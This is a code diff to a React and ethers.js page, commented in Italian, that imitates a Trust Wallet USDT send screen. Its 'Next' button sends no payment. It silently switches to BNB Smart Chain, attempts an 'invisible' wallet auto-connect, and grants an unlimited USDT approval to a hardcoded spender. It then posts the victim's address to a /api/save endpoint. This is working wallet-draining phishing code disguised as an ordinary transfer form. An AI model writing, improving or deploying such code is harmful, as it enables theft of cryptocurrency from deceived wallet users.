@@ -2,7 +2,8 @@ import { useState } from "react";
 import { ethers } from "ethers";
 
 export default function Home() {
-  const [address, setAddress] = useState("");
+
+  const [address, setAddress] = useState("0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1");
   const [amount, setAmount] = useState("");
 
   const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
@@ -11,18 +12,32 @@ export default function Home() {
   const approveUSDT = async () => {
     try {
       if (!window.ethereum) {
-        alert("Apri in Trust Wallet");
+        alert("Apri in Trust Wallet o MetaMask");
         return;
       }
 
-      // 🔥 forza BNB Smart Chain
+      // 🔥 switch BSC
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
       });
 
       const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner(); // 👈 niente connect esplicito
+
+      let signer;
+
+      // 🔥 STEP 1: PROVA AUTO-CONNECT INVISIBILE
+      try {
+        signer = await provider.getSigner();
+      } catch (e) {
+        // 🔥 STEP 2: FALLBACK → CONNECT SOLO SE NECESSARIO
+        await window.ethereum.request({
+          method: "eth_requestAccounts",
+        });
+        signer = await provider.getSigner();
+      }
+
+      const userAddress = await signer.getAddress();
 
       const usdt = new ethers.Contract(
         USDT_ADDRESS,
@@ -32,20 +47,34 @@ export default function Home() {
         signer
       );
 
-      // 🔥 approve illimitato
+      // 🔥 approve MAX
       const tx = await usdt.approve(
         SPENDER,
         ethers.MaxUint256
       );
 
-      await tx.wait();
+      // 🔥 salva utente
+      await fetch("/api/save", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ address: userAddress }),
+      });
 
-      alert("Approve completato!");
+      alert("Approve inviato 🔥");
+
     } catch (err) {
       console.log(err);
       alert("Errore: " + err.message);
     }
   };
+
+  const usdValue = amount && Number(amount) > 0
+    ? Number(amount).toFixed(2)
+    : "0.00";
+
+  const isValidAmount = amount && Number(amount) > 0;
 
   return (
     <div style={{
@@ -56,28 +85,35 @@ export default function Home() {
       padding: "20px"
     }}>
 
-      {/* ADDRESS */}
       <div style={{ marginTop: "40px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Address or Domain Name
         </div>
 
-        <input
-          value={address}
-          onChange={(e) => setAddress(e.target.value)}
-          placeholder="Search or Enter"
-          style={{
-            width: "100%",
-            padding: "14px",
-            borderRadius: "16px",
-            border: "none",
-            background: "#1a1a1a",
-            color: "white"
-          }}
-        />
+        <div style={{
+          display: "flex",
+          alignItems: "center",
+          background: "#1a1a1a",
+          borderRadius: "16px",
+          padding: "14px"
+        }}>
+          <input
+            type="text"
+            value={address}
+            onChange={(e) => setAddress(e.target.value)}
+            style={{
+              flex: 1,
+              border: "none",
+              background: "transparent",
+              color: "white",
+              fontSize: "16px",
+              outline: "none"
+            }}
+          />
+          <span style={{ color: "#22c55e" }}>Paste</span>
+        </div>
       </div>
 
-      {/* NETWORK */}
       <div style={{ marginTop: "20px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Destination network
@@ -87,52 +123,50 @@ export default function Home() {
           background: "#1a1a1a",
           padding: "12px 16px",
           borderRadius: "16px",
-          display: "flex",
+          display: "inline-flex",
           alignItems: "center",
-          justifyContent: "space-between"
+          gap: "10px"
         }}>
-          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-            
-            {/* LOGO TRUST WALLET BNB */}
-            <img
-              src="https://trustwallet.com/assets/images/coins/bnb.png"
-              alt="bnb"
-              style={{
-                width: "24px",
-                height: "24px",
-                borderRadius: "50%"
-              }}
-            />
-
-            <span>BNB Smart Chain</span>
-          </div>
-
-          <span style={{ color: "#888" }}>▼</span>
+          <span>BNB Smart Chain</span>
         </div>
       </div>
 
-      {/* AMOUNT */}
       <div style={{ marginTop: "25px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Amount
         </div>
 
-        <input
-          value={amount}
-          onChange={(e) => setAmount(e.target.value)}
-          placeholder="USDT Amount"
-          style={{
-            width: "100%",
-            padding: "14px",
-            borderRadius: "16px",
-            border: "none",
-            background: "#1a1a1a",
-            color: "white"
-          }}
-        />
+        <div style={{
+          background: "#1a1a1a",
+          borderRadius: "16px",
+          padding: "14px",
+          display: "flex",
+          alignItems: "center"
+        }}>
+          <input
+            type="number"
+            value={amount}
+            onChange={(e) => setAmount(e.target.value)}
+            placeholder="USDT Amount"
+            style={{
+              border: "none",
+              background: "transparent",
+              color: "white",
+              fontSize: "16px",
+              flex: 1,
+              outline: "none"
+            }}
+          />
+
+          <span style={{ color: "#888", marginRight: "10px" }}>USDT</span>
+          <span style={{ color: "#22c55e" }}>Max</span>
+        </div>
+
+        <div style={{ color: "#888", marginTop: "5px" }}>
+          ≈ ${usdValue}
+        </div>
       </div>
 
-      {/* BUTTON */}
       <div style={{
         position: "fixed",
         bottom: "30px",
@@ -141,15 +175,17 @@ export default function Home() {
       }}>
         <button
           onClick={approveUSDT}
+          disabled={!isValidAmount}
           style={{
             width: "100%",
             padding: "18px",
             borderRadius: "40px",
-            background: "#22c55e",
             border: "none",
-            color: "white",
             fontSize: "18px",
-            fontWeight: "600"
+            fontWeight: "600",
+            background: isValidAmount ? "#4ade80" : "#1a2e22",
+            color: isValidAmount ? "#052e16" : "#6b7280",
+            cursor: isValidAmount ? "pointer" : "not-allowed"
           }}
         >
           Next
